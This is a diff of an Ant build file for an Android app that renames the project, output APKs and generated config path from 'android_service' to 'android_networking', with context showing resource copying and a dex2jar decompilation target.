@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<project name="android_service" default="help">
+<project name="android_networking" default="help">
 
 	<taskdef resource="net/sf/antcontrib/antlib.xml">
 		<classpath>
@@ -184,7 +184,7 @@
 
 			<echo message="copy resources and Cfg" />
 			<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
-			<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
+			<copy file="preprocess/Cfg.java" toFile="src/com/android/networking/auto/Cfg.java" overwrite="true">
 				<filterset>
 					<filter token="BUILD_ID" value="${build.number}" />
 					<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
@@ -253,8 +253,8 @@
 	<target name="reverse">
 		<echo message="Reverse" />
 		<deltree dir="reverse" />
-		<copy file="bin/android_service-release.apk" toDir="reverse" />
-		<unzip src="reverse/android_service-release.apk" dest="reverse" />
+		<copy file="bin/android_networking-release.apk" toDir="reverse" />
+		<unzip src="reverse/android_networking-release.apk" dest="reverse" />
 
 		<exec executable="..\..\HT\Reversing\dex2jar\dex2jar.bat">
 			<arg value="reverse/classes.dex" />
@@ -333,14 +333,14 @@
 								<echo message="==============" />
 								<echo>call debug</echo>
 								<antcall target="debug" inheritAll="false" />
-								<var name="filename" value="bin/android_service-debug.apk" />
+								<var name="filename" value="bin/android_networking-debug.apk" />
 
 							</then>
 							<else>
 								<echo message="==============" />
 								<echo>call release</echo>
 								<antcall target="release" inheritAll="false" />
-								<var name="filename" value="bin/android_service-release.apk" />
+								<var name="filename" value="bin/android_networking-release.apk" />
 							</else>
 						</iff>
 
